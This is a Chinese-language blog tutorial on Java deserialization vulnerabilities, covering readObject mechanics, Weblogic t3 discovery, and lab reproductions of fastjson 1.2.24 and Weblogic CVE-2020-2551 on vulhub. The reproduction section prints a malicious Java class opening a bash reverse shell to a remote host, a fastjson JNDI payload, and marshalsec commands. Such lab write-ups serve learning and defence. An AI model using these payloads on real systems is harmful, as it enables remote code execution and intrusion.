> 原文链接: https://www.anquanke.com//post/id/202672 


# JAVA代码审计系列之反序列化入门(二)


                                阅读量   
                                **542428**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p4.ssl.qhimg.com/t01f27524849b931ee2.jpg)](https://p4.ssl.qhimg.com/t01f27524849b931ee2.jpg)



## JAVA代码审计系列之反序列化入门(二)

## 0x0 系列目录

[Java代码审计之入门篇（一）](https://www.anquanke.com/post/id/197641)



## 0x1 前言

JAVA的反序列化应该是JAVA WEB里面非常重要的一环，笔者就从萌新角度出发，探讨下JAVA反序列化的实现机制和反序列化攻击思路。

PS.从0到1，由浅入深，跟着笔者，一起推开JAVA反序列的大门。

(阅读此文之前，特别建议读者一定要先掌握JAVA基本编程知识，毕竟跟PHP来说，编程风格还是不太一样的)



## 0x2 java反序列化概念

笔者阅读了不少文章，发现2018年的先知议题中师傅终结的相当精炼易懂(PS.2020年学习师傅们玩剩的东西，tcl)

> 简单说下:
序列化和反序列化是java引入的数据传输存储接口,通过这种机制能够实现数据结构和对象的存储和传输，举一个例子，比如一座高楼，序列化高楼的过程可以理解为将高楼按照一定的规律拆成一块块砖，并做好标志(比如这块砖必须出现在某某位置),然后排列好，反序列化的过程就是将这些排列好的砖头按照规则重建为高楼。



## 0x3 PHP 与 JAVA 的差异

其实我个人觉得没必要深究他们的序列化结构,当然有些tips是可以出现在CTF中的

这些结构采用的编码算法能决定他们的存储容量。

Python、PHP等语言，都有一套流行的序列化算法。

这里我们简单来了解下:

PHP的序列化字符串:

这里直接取我之前写的一篇文章的例子:

```
&lt;?php
class A`{`
    public $t1;
    private $t2='t2';
    protected $t3 = 't3';
`}`

// create a is_object
$obj = new A();
$obj-&gt;t1 = 't1';
var_dump($obj);
echo serialize($obj);
?&gt;
```

[![](https://raw.githubusercontent.com/mstxq17/figuredbed/master/imgimage-20200407164213618.png)](https://raw.githubusercontent.com/mstxq17/figuredbed/master/imgimage-20200407164213618.png)

可以看到这种是字符流形式的字符串,而Java的是二进制的数据流,导致不能够直观理解原结构，但是这种序列化的好处应该是比较高效，能够在网络中以比较少的数据包传输比较完整的结构。

直接用Eclipse新建一个JAVA Project

[![](https://raw.githubusercontent.com/mstxq17/figuredbed/master/imgimage-20200407171854163.png)](https://raw.githubusercontent.com/mstxq17/figuredbed/master/imgimage-20200407171854163.png)

```
package securityTest;

import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;

public class Test `{`

    public static void main(String[] args) throws Exception `{`
        // TODO Auto-generated method stub
        // 这里是字符串对象
        String name = "xq17 study";
        // 序列化过程,后缀的话一般取ser作为写入文件后缀
        FileOutputStream fileOutputStream= new FileOutputStream("name.ser");
        ObjectOutputStream oStream = new ObjectOutputStream(fileOutputStream);
        // 写入序列化对象(序列化函数)
        oStream.writeObject(name);
        System.out.println("Serailized ok!");
    `}`

`}`
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://raw.githubusercontent.com/mstxq17/figuredbed/master/imgimage-20200407172811599.png)

这里我们需要掌握的一个基础知识就是:[序列化规范](https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html)

```
final static short STREAM_MAGIC = (short)0xaced;
final static short STREAM_VERSION = 5;
```

这里可以看到`aced`文件头是java序列化文件的一个特征,这个会有什么用的呢？

下面在漏洞挖掘的部分我们再进行细讨。

## 0x4 JAVA反序列化例子

了解了PHP的序列化过程，那么自然就该过渡到了反序列化这一步了。

在PHP学习中，我们知道魔法方法如`_destruct`函数会在反序列化过程中触发,

那么在JAVA中呢,比较常用的自动触发方法是:`readObject`

我们写一个例子来实验下:

`User`类

```
package securityTest;

import java.io.IOException;
import java.io.Serializable;


public class User implements Serializable `{`

    /**
     * 
     */
    private static final long serialVersionUID = 8593546012716519472L;
    private String name;
    private String age;

    public String getName() `{`
        return name;
    `}`

    public void setName(String name) `{`
        this.name = name;
    `}`

    private void readObject(java.io.ObjectInputStream in) throws IOException `{`
//        Runtime.getRuntime().exec("/System/Applications/Calculator.app");
        System.out.println("i am readObject");
    `}`
`}`
```

`serialVersionUID`这个值eclipse会提示你显性声明,可以自定义，也可以用默认生成的值，就是说如果你不声明那么照样也会有默认的值，

这个值是根据`JDK`版本及其你的类结构来生成的，所以你需要使用默认值，要么就不显示声明，要不就写完类再声明。

[![](https://raw.githubusercontent.com/mstxq17/figuredbed/master/imgimage-20200408003930721.png)](https://raw.githubusercontent.com/mstxq17/figuredbed/master/imgimage-20200408003930721.png)

这个值如果不相同的话,会导致反序列化失败的，因为反序列化过程中会校验这个值,这里因为我们服务端和生成序列化的数据同一环境，所以这个值肯定相同，但是如果在远程环境上，我们就需要注意各种版本问题了，后面我会在踩坑过程与读者分析，这里我们还是抓主线来学习。

下面我们写一个存在反序列漏洞类`VulnTest`

```
package securityTest;

import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInput;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;

public class VulnTest `{`

    public static void main(String[] args) throws IOException, ClassNotFoundException `{`
        // TODO Auto-generated method stub
        User user = new User();
        user.setName("xq17");
        // 序列化写入文件
        FileOutputStream fos = new FileOutputStream("user.ser");
        ObjectOutputStream os = new ObjectOutputStream(fos);
        os.writeObject(user);
        os.close();
        // 序列化读取文件
        FileInputStream fis = new FileInputStream("user.ser");
        ObjectInputStream ois = new ObjectInputStream(fis);
        System.out.println("开始反序列化");
        User userFromSer = (User) ois.readObject();
        ois.close();

    `}`
`}`
```

[![](https://raw.githubusercontent.com/mstxq17/figuredbed/master/imgimage-20200408010429256.png)](https://raw.githubusercontent.com/mstxq17/figuredbed/master/imgimage-20200408010429256.png)

那么除了`readObject`方法之外还有什么方法吗？

为什么`readObject`一定需要设置为`private`?

这里其实我们可以在eclipse直接下一个断点，跟一下相应的源码。

(这里因为我们直接Debug搞的是class字节码文件，所以变量值的话并不会显示)

这里为了减轻阅读难度，笔者省略了一些中间过程，读者可以自行去调试。

先说下入口:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://raw.githubusercontent.com/mstxq17/figuredbed/master/imgimage-20200408114549973.png)

调用该方法的调用栈

[![](https://raw.githubusercontent.com/mstxq17/figuredbed/master/imgimage-20200408120047487.png)](https://raw.githubusercontent.com/mstxq17/figuredbed/master/imgimage-20200408120047487.png)

我们可以看到这里调用了反射机制,这里我们可以学习一下反射机制的原理及其作用。

> java反射机制可以动态地创建对象并调用其熟悉。
Java 反射主要提供以下功能：
<ul>
- 在运行时判断任意一个对象所属的类；
- 在运行时构造任意一个类的对象；
- 在运行时判断任意一个类所具有的成员变量和方法（通过反射甚至可以调用private方法）；
- 在运行时调用任意一个对象的方法
</ul>

一个正常的反射调用流程机制:

> <pre><code class="lang-JAVA hljs">public class test1 `{`
public static void main(String[] args) throws IllegalAccessException, InstantiationException, NoSuchMethodException, InvocationTargetException `{`
  Class&lt;?&gt; klass = methodClass.class;
  //创建methodClass的实例
  Object obj = klass.newInstance();
  //获取methodClass类的add方法
  Method method = klass.getMethod("add",int.class,int.class);
  //调用method对应的方法 =&gt; add(1,4)
  Object result = method.invoke(obj,1,4);
  System.out.println(result);
`}`
`}`
class methodClass `{`
public final int fuck = 3;
public int add(int a,int b) `{`
  return a+b;
`}`
public int sub(int a,int b) `{`
  return a+b;
`}`
`}`
</code></pre>
所以说这里想调用动态生成类的方法，应该先获取对象，在获取方法，然后方法进行反射，传入参数，进行调用。

所以我们可以看下他通过反射机制获取的是什么对象？

其实不用调试也知道，肯定是我们序列化的对象`User`

[![](https://raw.githubusercontent.com/mstxq17/figuredbed/master/imgimage-20200408120613335.png)](https://raw.githubusercontent.com/mstxq17/figuredbed/master/imgimage-20200408120613335.png)

这里可以看到`obj`的获取过程，获取描述然后得到实例。

[![](https://raw.githubusercontent.com/mstxq17/figuredbed/master/imgimage-20200408125130496.png)](https://raw.githubusercontent.com/mstxq17/figuredbed/master/imgimage-20200408125130496.png)

通过debug我们不难看到,`readObjectMethod`其实就是我们的`User`类的重写的`readObject`方法，所以说这个调用在序列化过程中会自动通过反射机制来触发。

那么我们可以看看这个方法是怎么`getMethod`得来的

[![](https://raw.githubusercontent.com/mstxq17/figuredbed/master/imgimage-20200408125629383.png)](https://raw.githubusercontent.com/mstxq17/figuredbed/master/imgimage-20200408125629383.png)

当我跟到这里的时候发现这里的判断主要是判断`readObjectMethod`这个类`ObjectStreamClass`的属性是否为空，然后发现这里已经找到我们的方法了，所以这个`getMethod`的过程应该在前面,我们可以重新debug一下。

[![](https://raw.githubusercontent.com/mstxq17/figuredbed/master/imgimage-20200408133555856.png)](https://raw.githubusercontent.com/mstxq17/figuredbed/master/imgimage-20200408133555856.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](JAVA%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0(%E4%BA%8C).assets/image-20200408135619513.png)

最终我们可以看到这个值,是在构造函数的时候就已经被设置好了,并且对方法做出了要求

> <ul>
- 返回类型为void(null)
- 修饰符不能包含static
- 修饰符必须包含private
</ul>

这个class文件的路径是: 在`rt.jar-&gt;java.io-&gt;ObejectSteamClass`

[![](https://raw.githubusercontent.com/mstxq17/figuredbed/master/imgimage-20200408135021207.png)](https://raw.githubusercontent.com/mstxq17/figuredbed/master/imgimage-20200408135021207.png)至于还有没有其他自动触发的方法，我们可以再看看else分支

[![](https://raw.githubusercontent.com/mstxq17/figuredbed/master/imgimage-20200408140624739.png)](https://raw.githubusercontent.com/mstxq17/figuredbed/master/imgimage-20200408140624739.png)

`readObjectNoData`

这个方法也是可以触发。

至于怎么触发建议可以参考下: [Serialization中的readObjectNoData](https://blog.csdn.net/fjh658/article/details/6655403)

PS.

或者尝试去继续跟一下源码,这个笔者后期继续深入的时候，再与各位细究其中的原理，目前我们还是先熟悉反序列化漏洞的基础知识，并学会变化利用该漏洞，后续再尝试分析原理，然后去挖掘反序列化链条,这就是一些后话啦，入门系列我们还是以萌新为基础。

(Eclipse 调试相对于 IDEA来说简直就是弟弟,后面的教程笔者就用IDEA来进行debug调试)



## 0x5 漏洞黑盒挖掘入门思路

这里我觉得可以从Weblogic的第一个漏洞开始说起。(Ps.下面作者代指漏洞作者)

1.先grep搜索一下Weblogic有没有用到漏洞库

```
root@us-l-breens:/opt/OracleHome# grep -R InvokerTransformer .
Binary file ./oracle_common/modules/com.bea.core.apache.commons.collections.jar matches
```

这里当时作者提到了一个小坑点，就是weblogic重命名了`commons-collections.jar`这个jar库,所以我们搜索的时候最好根据关键的函数名来搜索。

2.寻找可以发送序列化字符的entry point(入口点)

当时作者采用的黑盒测试的方法，通过用`wireShark`监听Weblogic的数据流，

然后在weblogic做一下公共操作比如尝试登录下账户密码，

```
root@us-l-breens:/opt/OracleHome/user_projects/domains/base_domain/bin# ./stopWebLogic.sh 
Stopping Weblogic Server...

Initializing WebLogic Scripting Tool (WLST) ...

Welcome to WebLogic Server Administration Scripting Shell

Type help() for help on available commands

Please enter your username :weblogic
Please enter your password :
Connecting to t3://us-l-breens:7001 with userid weblogic ...
This Exception occurred at Thu Nov 05 18:32:46 EST 2015.
javax.naming.AuthenticationException: User failed to be authenticated. [Root exception is java.lang.SecurityException: User failed to be authenticated.]
Problem invoking WLST - Traceback (innermost last):
  File "/opt/OracleHome/user_projects/domains/base_domain/shutdown-AdminServer.py", line 3, in ?
  File "&lt;iostream&gt;", line 19, in connect
  File "&lt;iostream&gt;", line 553, in raiseWLSTException
WLSTException: Error occurred while performing connect : User failed to be authenticated. : User failed to be authenticated. 
Use dumpStack() to view the full stacktrace :

Done
Stopping Derby Server...
```

[![](https://raw.githubusercontent.com/mstxq17/figuredbed/master/imgimage-20200408101350395.png)](https://raw.githubusercontent.com/mstxq17/figuredbed/master/imgimage-20200408101350395.png)

然后发现了数据流里面出现了`magic bytes`:`ac ed 00 05`

通过这一点可以看到，我们平时去挖掘该类漏洞的时候，面对庞大的程序，黑盒测试反而更为简单，我们只要匹配一下数据流的`magic`就可定位到可能存在的漏洞点了。

3.尝试构造Exploit

这个具体过程，其实作者走了不少弯路,[weblogic漏洞发现](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#weblogic),这里我也简单和大家说说。就是在构造t3协议数据包的时候，直接替换原先数据包的payload是不行的，因为t3数据包分组中第一个chunk会指定信息的长度，如果不调整这个长度就会爆出EOFException的错误，所以说当时作者当时反复调试搞出了二进制流的值，最好编写出了Python的利用脚本

```
payloadObj = open(sys.argv[3],'rb').read()
payload='x00x00x09xf3x01x65x01xffxffxffxffxffx...........
payload=payload+payloadObj
payload=payload+'xfex01x00x00xacxedx00x05x73x72x...........
print 'sending payload...'
'''outf = open('payload.tmp','w')
outf.write(payload)
outf.close()'''
sock.send(payload)
```

可以看到是分为3部分的,

`payloadobj`其实就是我们`ysoserial`攻击payload。其他两部分主要是保证正常解析t3协议。

**PS.**

可以看出来作者在调试过程中花费的时间还是挺多的，所以如果我们小萌新想挖这个漏洞的话难度还是很大的，必须非常熟悉协议调试，及其java、python一些工具的编写的,但是平时的时候，我们可以跟一下http协议包的一些base64字段，解码看看，如果存在序列化数据，我们直接替换为payload可以尝试下，这里笔者还没遇到相关环境，所以只能提供一下思路了。



## 0x6 漏洞复现之练手篇

为了照顾萌新，也因为自身知识浅薄，笔者打算不从反序列化漏洞利用过程中用到RMI、JNDI、LDAP、JRMP、JMX、JMS等各种深奥的技术劝退小萌新,我们不如站在巨人的肩膀上，先搭建好环境复现一波，后续我们在慢慢深入探讨一些相关知识。(Ps.笔者觉得实践出快乐,单单研究是比较枯燥的,通过实践能很好得将知识或深或浅运用上)

这里我选取比较经典的三个应用典型的反序列化漏洞作为学习的例子。

首先我们要安装一个工具来开启RMI 或者 LDAP服务器

为什么会需要呢, 这里可以提前简单提一下，因为反序列化的过程中，我们不一定能找到直接执行命令的点，但是有一些远程加载恶意类的点来进行代码执行，所以为了匹配这种点，我们的恶意payload需要配置在相应的服务上，至于具体过程，下次我讲weblogic会再细谈,我们先把复现环境弄出来。

> marshalsec
[https://github.com/mbechler/marshalsec](https://github.com/mbechler/marshalsec)

1.`git clone https://github.com/mbechler/marshalsec.git`

2.maven 编译

`mvn clean package -DskipTests`

3.使用方法

```
java -cp target/marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.&lt;Marshaller&gt; [-a] [-v] [-t] [&lt;gadget_type&gt; [&lt;arguments...&gt;]]
```

4.常用的加载类方式

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://raw.githubusercontent.com/mstxq17/figuredbed/master/imgimage-20200408191510814.png)

下面我们来使用这个工具。

### <a class="reference-link" name="0x6.1%20fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"></a>0x6.1 fastjson 反序列化漏洞

1.2.48 版本以下通杀的:

漏洞具体分析可以读一下:[FastJson最新反序列化漏洞分析](https://xz.aliyun.com/t/5680)

fastjson 反序列化漏洞其实很有意思,让人觉得很神奇吧。

后面如果分析的话，我会插入一些关于这个点的讲解。

**这里我们采取Vulnhub环境来搭建相关漏洞环境**

[fastjson 1.2.24 反序列化导致任意命令执行漏洞](https://vulhub.org/#/environments/fastjson/1.2.24-rce/)

1.下载vulnhub

`git clone https://github.com/vulhub/vulhub.git`

2.进入fastjson相应漏洞的复现环境

`cd ./vulhub/fastjson/1.2.24-rce`

3.启动docker

`docker-compose up -d`

4.访问vuln url

`http://127.0.0.1:8090`

5.burp捕捉相关数据包

```
curl http://127.0.0.1:8090 --proxy 127.0.0.1:8080  -H "Content-Type: application/json" --data '`{`"name":"hello", "age":20`}`'
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://raw.githubusercontent.com/mstxq17/figuredbed/master/imgimage-20200408193349091.png)

6.编译恶意类

```
import java.lang.Runtime;
import java.lang.Process;

public class EvilClass `{`
    static `{`
        try `{`
            Runtime rt = Runtime.getRuntime();
            String[] commands = `{`"touch", "/tmp/success"`}`;
            Process pc = rt.exec(commands);
            pc.waitFor();
        `}` catch (Exception e) `{`
            // do nothing
        `}`
    `}`
`}`
```

`javac evilClass.java`
1. Python起一个web服务存放恶意类让marshalsec来绑定
```
1.python -m SimpleHTTPServer
# Serving HTTP on 0.0.0.0 port 8000 ...
# 切换到marshalsec的target路径执行
2.java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://192.168.65.2:8000/#EvilClass" 9999
```

8.执行payload

```
`{`
    "b":`{`
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://192.168.65.2:9999/EvilClass",
        "autoCommit":true
    `}`
`}`
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://raw.githubusercontent.com/mstxq17/figuredbed/master/imgimage-20200408201159232.png)

可以看到成功执行了命令,可以看到`marshalsec`的作用类似个中转器。

这里的漏洞环境是`JDK1.8_8u102` 可以利用:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://raw.githubusercontent.com/mstxq17/figuredbed/master/imgimage-20200408203019174.png)

但是如果漏洞环境是其他的jdk版本，则相应有一些限制需要绕过了，后面我们细讲jndi注入的时候在讨论。

[如何绕过高版本JDK的限制进行JNDI注入利用](https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html)

ps.

还有个1.2.48 bypass autoType检查的rce 的环境,读者感兴趣可以自行搭建下。

[Fastjson 1.2.47 远程命令执行漏洞](https://vulhub.org/#/environments/fastjson/1.2.47-rce/)

### <a class="reference-link" name="0x6.2%20weblogic%20cve%202551%20%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E"></a>0x6.2 weblogic cve 2551 反序列漏洞

笔者头铁敢选择这个到处是坑的漏洞复现，主要还是站在各位师傅的肩膀上，略微记录下自己的复现过程。

先简单描述下这个漏洞的情况:

> 2020年1月15日, Oracle官方发布了CVE-2020-2551的漏洞通告，漏洞等级为高危，CVVS评分为9.8分，漏洞利用难度低。影响范围为10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0。

了解下一些相关知识:

> 1.7001 是个动态解析端口(不同协议不同处理)
2.2551漏洞出在IIOP协议上,该协议默认开启
3.不同的weblogic版本会导致利用不同
根据师傅的测试可以得知:
成功的版本为:
10.3.6.0.0 12.1.3.0.0 (低版本)
12.2.1.3.0 12.2.1.4.0 (高版本)

其实这个漏洞真的相当多坑，各种网络环境问题，由此衍生了许多回显方案的提出，感觉挺有研究价值的一个洞，几乎应用了各种各样的java反序列利用漏洞技巧,这里我们还是初探为主，搭建环境先Run一下，找下感觉。

1.编译POC

`git clone https://github.com/Y4er/CVE-2020-2551`

这里笔者直接偷懒不编译了,直接作者已经编译的`weblogic_CVE_2020_2551.jar`

2.Weblogic10.3.6.0 环境

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://raw.githubusercontent.com/mstxq17/figuredbed/master/imgimage-20200409003127985.png)

这里采取的还是`vulhub`的docker环境比较方便。

3.编译exp class:

这里我们修改下恶意执行命令类为反弹shell

```
import java.lang.Runtime;
import java.lang.Process;

public class EvilClass `{`
    static `{`
        try `{`
            Runtime rt = Runtime.getRuntime();
            String[] commands = `{`"/bin/bash", "-c", "bash -i &gt;&amp; /dev/tcp/192.168.0.3/9011 0&gt;&amp;1"`}`;
            Process pc = rt.exec(commands);
            pc.waitFor();
        `}` catch (Exception e) `{`
            // do nothing
        `}`
    `}`
`}`
```

`javac -source 1.6 -target 1.6 EvilClass.java`

[![](https://raw.githubusercontent.com/mstxq17/figuredbed/master/imgimage-20200409005338746.png)](https://raw.githubusercontent.com/mstxq17/figuredbed/master/imgimage-20200409005338746.png)

然后就和上面那个例子差不多了,只不过我们这次多了一个监听的过程。

```
1.python -m SimpleHTTPServer 8000
2.java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://192.168.0.3:8000/#EvilClass" 1099
3.java -jar weblogic_CVE_2020_2551.jar 192.168.0.3 7001 rmi://192.168.0.3:1099/exp
```

这里:`192.168.0.3`是我的本机IP内网IP,docker可以访问,但是本机没办法访问docker的内容。

[![](https://raw.githubusercontent.com/mstxq17/figuredbed/master/imgimage-20200409005802236.png)](https://raw.githubusercontent.com/mstxq17/figuredbed/master/imgimage-20200409005802236.png)

这样会失败的,因为你这个IIOP涉及一个bind的过程，这个过程需要weblogic返回第一个地址来让我们攻击的那个jar来绑定，这个返回地址其实是docker的内网ip,然后我们去绑定的时候是访问不到这个ip的，[手把手教你解决Weblogic CVE-2020-2551 POC网络问题](https://xz.aliyun.com/t/7498),这里作者之所以演示成功，是因为作者直接把kali放在跟docker同一网段里面。

那么该怎么解决呢？？ 那我们修改下exp呗，就是让它不要用weblogic返回的地址内网ip去访问7001，而是指定我们可以访问的ip+7001去访问。(这个关于为什么，后面我细说IIOP协议实现机制的时候会跟小萌新们一起探讨，我们先run起来)

1.Idea 导入项目

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://raw.githubusercontent.com/mstxq17/figuredbed/master/imgimage-20200409090513655.png)

2.重写Opprofile.class类

路径如下:

`CVE-2020-2551srclibwlfullclient.jar!weblogiciiopIOPProfile.class`

IDEA定位进去:

修改过程:

```
无源码的情况下，修改.class文件内容：

1、在开发工具（idea）中建立一个包名、类名完全相同的类文件。

2、将.class文件中的内容复制到自己新建的类中进行修改.

3、完成后，重新编译、启动，修改内容生效。

ps.直接在src目录下新建一个同类的文件，copy下代码过来就行，idea会根据包名自动编译的。
```

[![](https://raw.githubusercontent.com/mstxq17/figuredbed/master/imgimage-20200409092922756.png)](https://raw.githubusercontent.com/mstxq17/figuredbed/master/imgimage-20200409092922756.png)

[![](https://raw.githubusercontent.com/mstxq17/figuredbed/master/imgimage-20200409093415722.png)](https://raw.githubusercontent.com/mstxq17/figuredbed/master/imgimage-20200409093415722.png)

然后我们重新编译项目打包就好了。

[![](https://raw.githubusercontent.com/mstxq17/figuredbed/master/imgimage-20200409094813785.png)](https://raw.githubusercontent.com/mstxq17/figuredbed/master/imgimage-20200409094813785.png)

```
java -jar CVE-2020-2551.jar 192.168.0.3 7001 rmi://192.168.0.3:1099/exp
```

[![](https://raw.githubusercontent.com/mstxq17/figuredbed/master/imgimage-20200409095646653.png)](https://raw.githubusercontent.com/mstxq17/figuredbed/master/imgimage-20200409095646653.png)

这样子就可以成功了。

**Ps.**

关于这个洞出现的坑点，要一一解决的话,我们就需要梳理清楚IIOP的交互逻辑及其数据格式。有兴趣可以读一下下文，尝试自己写一个交互。

[Weblogic CVE-2020-2551 IIOP协议反序列化RCE](https://y4er.com/post/weblogic-cve-2020-2551/)

上面能不能动态修改呢？ 毕竟修改一行代码有点难度。

工具化的解决nat问题的话，后面我们再细讨吧,毕竟我也是个小萌新。



## 0x7 总结

我个人感觉本文技术含量并没有，所以阅读起来相对比较直白和简单，能给萌新选手一个直观的java反序列漏洞当前的现状，也希望本文能为自己以及各位萌新一个阅读我下文参考链接的基础能力，然后从本文发散的知识点去深入学习。当然，后面我会继续研究，把这些知识点再深入下(太菜了)。



## 0x8 参考链接

[浅析Java序列化和反序列化](https://xz.aliyun.com/t/3847#toc-3)

[Java反序列之从萌新到菜鸟](//www.kingkk.com/2019/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E4%B9%8B%E4%BB%8E%E8%90%8C%E6%96%B0%E5%88%B0%E8%8F%9C%E9%B8%9F/))

[Java反序列化漏洞从入门到深入](https://xz.aliyun.com/t/2041)

[Java反序列化1：基础](//anemone.top/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/))

[如何攻击Java反序列化过程](https://www.anquanke.com/post/id/86641)

[Weblogic漏洞挖掘](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#background)

[Java serialVersionUID 有什么作用？](https://www.jianshu.com/p/91fa3d2ac892)

[深入解析Java反射（1）](https://www.sczyh30.com/posts/Java/java-reflection-1/)

[如何绕过高版本JDK的限制进行JNDI注入利用](https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html)

[CVE-2020-2551复现](https://www.cnblogs.com/lxmwb/p/12643684.html)

[手把手教你解决Weblogic CVE-2020-2551 POC网络问题](https://xz.aliyun.com/t/7498)
